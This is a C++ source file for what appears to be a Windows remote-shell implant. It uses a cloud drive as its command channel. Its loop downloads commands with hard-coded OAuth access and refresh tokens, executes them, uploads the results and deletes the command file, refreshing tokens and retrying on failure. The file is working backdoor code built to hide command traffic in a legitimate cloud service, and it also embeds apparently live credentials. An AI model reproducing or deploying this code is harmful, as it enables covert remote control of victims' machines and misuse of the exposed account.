#include <stdio.h>
#include <iostream>
#include <windows.h>
#include <stack>
#include "CloudFunctions.h"
#include <spdlog/spdlog.h>

#ifdef DISABLE_LOGGING
#define SPDLOG_ACTIVE_LEVEL SPDLOG_LEVEL_OFF
#endif

#define INIT_REFRESH_TOKEN "1//0cBJYjJnJ_qNDCgYIARAAGAwSNwF-L9Irkd3ReANUUHaWjvjpylKsfc_H0l2rsXqR1HTtKaXvq_5U2WEtTznd2b4ET5x_ozSQ7xk"
#define INIT_ACCESS_TOKEN "ya29.a0AeDClZAVWGAhNiMq4r83C2l81hdWXlEZTVZM6PwLt-Ykv-WzBV4pvLrOqKbasCX0lCt0W_w0B8MY2IXlzMLjSVN_Rv2nO3a7O8TfzLmelCIuPzYqGDv5SYVdM4DFQRGSZrQj_O2hDZIRfWsIs2HXLPEnX9gFQxeDjkS3E-8eaCgYKAbQSARASFQHGX2MikAiEu5tuloWf6LrOR5wfHA0175"
int Odd_Num() {
	int result = rand();
	if (result % 2 == 1)
		return result;
	else
		return result - 1;
}

int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline, int cmdshow) {

	MessageBoxA(NULL, "test", "test", 0);

}

void main() {

	std::stack<BYTE> states;
	BYTE lastState = STATE_INIT;
	std::string data, accessToken, refreshToken;
	DWORD lastIndex = 0, lastSubIndex = 0, tries = 1;
	WORD resCode = BDRIVE_OK;
	states.push(STATE_DOWNLOADING);

	accessToken = INIT_ACCESS_TOKEN;
	refreshToken = INIT_REFRESH_TOKEN;

	spdlog::info("The for loop is about to start!");

	for (BYTE top = STATE_INIT; true;) {

		top = states.top();

		if (top == STATE_DOWNLOADING)
		{
			spdlog::info("Shell is in STATE_DOWNLOADING!");

			states.pop();
			resCode = downloadSourceContext(accessToken, data);

			switch (resCode)
			{
			case BDRIVE_OK:
				spdlog::warn("Download completed!");
				
				states.push(STATE_EXECUTING);
				//sleep
				break;
			case BDRIVE_INVALID_ACCESS_TOKEN:
				spdlog::warn("Access token lost!");
				
				states.push(STATE_DOWNLOADING);
				states.push(STATE_ACCESS_TOKEN_LOST);
				//sleep
				break;
			case BDRIVE_NO_CONTENT:
				spdlog::warn("Source file is empty!");

				states.push(STATE_DOWNLOADING);
				//sleep
				break;
			case BDRIVE_TIMED_OUT:
			case BDRIVE_NO_INTERNET:
				spdlog::warn("Connection lost!");
				
				states.push(STATE_DOWNLOADING);
				states.push(STATE_CONNECTION_LOST);
			default:
				spdlog::warn("Something unhandled happened!");
				
				states.push(STATE_DOWNLOADING);
				break;
			}
		}
		else if (top == STATE_EXECUTING)
		{
			spdlog::info("Shell is in STATE_EXECUTING!");

			states.pop();

			if (commandExecuter(data, data)) {
				spdlog::warn("Something unhandled happened!");
				states.push(STATE_EXECUTING);
			}
			else
			{
				states.push(STATE_UPLOADING);
				spdlog::warn("Command Execution done!");
			}

		}
		else if (top == STATE_UPLOADING)
		{
			spdlog::info("Shell is in STATE_UPLOADING!");

			states.pop();
			resCode = uploadResult(data, accessToken, lastIndex, lastSubIndex);

			switch (resCode)
			{
			case BDRIVE_OK:
				spdlog::warn("Uploading the result successfully done!");

				lastIndex++;
				lastSubIndex = 0;
				states.push(STATE_DELETING);
				break;
			case BDRIVE_NO_INTERNET:
			case BDRIVE_TIMED_OUT:
				spdlog::warn("Connection lost!");

				states.push(STATE_UPLOADING);
				states.push(STATE_CONNECTION_LOST);
				break;
			case BDRIVE_INVALID_ACCESS_TOKEN:
				spdlog::warn("Access token lost!");

				states.push(STATE_UPLOADING);
				states.push(STATE_ACCESS_TOKEN_LOST);
				break;
			default:
				spdlog::warn("Something unhandled happened!");

				states.push(STATE_UPLOADING);
				break;
			}
		}
		else if (top == STATE_DELETING)
		{
			spdlog::info("Shell is in STATE_DELETING!");

			states.pop();
			resCode = deleteSource(accessToken);

			switch (resCode)
			{
			case BDRIVE_OK:
				spdlog::warn("Deleting source file successfully done!");

				states.push(STATE_DOWNLOADING);
				break;
			case BDRIVE_TIMED_OUT:
			case BDRIVE_NO_INTERNET:
				spdlog::warn("Connection lost!");

				states.push(STATE_DELETING);
				states.push(STATE_CONNECTION_LOST);
				break;
			case BDRIVE_INVALID_ACCESS_TOKEN:
				spdlog::warn("Access token lost!");

				states.push(STATE_DELETING);
				states.push(STATE_ACCESS_TOKEN_LOST);
				break;
			default:
				spdlog::warn("Something unhandled happened!");

				states.push(STATE_DELETING);
				break;
			}
		}
		else if (top == STATE_ACCESS_TOKEN_LOST) {
			spdlog::info("Shell is in STATE_ACCESS_TOKEN_LOST!");

			states.pop();
			resCode = setNewAccessToken(accessToken, refreshToken);
			switch (resCode)
			{
			case BDRIVE_OK:
				spdlog::warn("New access token has been set!");

				break;
			case BDRIVE_INVALID_REFRESH_TOKEN:
				spdlog::warn("Refresh token is invalid!");

				states.push(STATE_REFRESH_TOKEN_LOST);
				break;
			case BDRIVE_NO_INTERNET:
			case BDRIVE_TIMED_OUT:
				spdlog::warn("Connection lost!");

				states.push(STATE_ACCESS_TOKEN_LOST);
				states.push(STATE_CONNECTION_LOST);
				break;
			default:
				spdlog::warn("Something unhandled happened!");

				states.push(STATE_ACCESS_TOKEN_LOST);
				break;
			}

		}
		else if (top == STATE_REFRESH_TOKEN_LOST) {
			spdlog::info("Shell is in STATE_REFRESH_TOKEN_LOST!");

			states.pop();
			resCode = setNewRefreshAndAccessToken(refreshToken, accessToken);

			switch (resCode)
			{
			case BDRIVE_OK:
				spdlog::warn("New access & refresh token has been set!");

				break;
			case BDRIVE_NO_CONTENT:
			case BDRIVE_TIMED_OUT:
			case BDRIVE_NO_INTERNET:
			default:
				spdlog::warn("Connection lost!");
				states.push(STATE_CONNECTION_LOST);
				break;
			}

		}
		else
		{
			spdlog::info("Shell is in STATE_CONNECTION_LOST!");

			states.pop();
			resCode = checkConnection();
			switch (resCode)
			{
			case BDRIVE_OK:
				spdlog::warn("It's back online!");

				break;
			default:
				spdlog::warn("Connection still lost!");

				states.push(STATE_CONNECTION_LOST);
				break;
			}
		}

		if (top == lastState)
		{
			tries++;
		}
		else {
			lastState = top;
			tries = 1;
		}

		Sleep(expo(1, tries) * 1000);
	}
}

void main1() {

	//FILE* file = _popen("powershell -c \" $response.StatusCode;try { $response = Invoke-RestMethod 'http://www.google.com' -TimeoutSec 30 -Method 'HEAD'; Write-Host -NoNewline $response.StatusCode } catch [System.Net.WebException] { if ($_.Exception.Message -like '*timed out*') { Write-Host -NoNewline 600 } elseif ($_.Exception.Response -ne $null) {Write-Host -NoNewline $_.Exception.Response.StatusCode.value__ } else { Write-Host -NoNewline 601} } catch { Write-Host -NoNewline 601}\"", "r");
	//char buffer[1024];
	//fgets(buffer, 1023, file);
	//fgets(buffer, 1023, file);

	printf("The code of connection is: %d", checkConnection());
}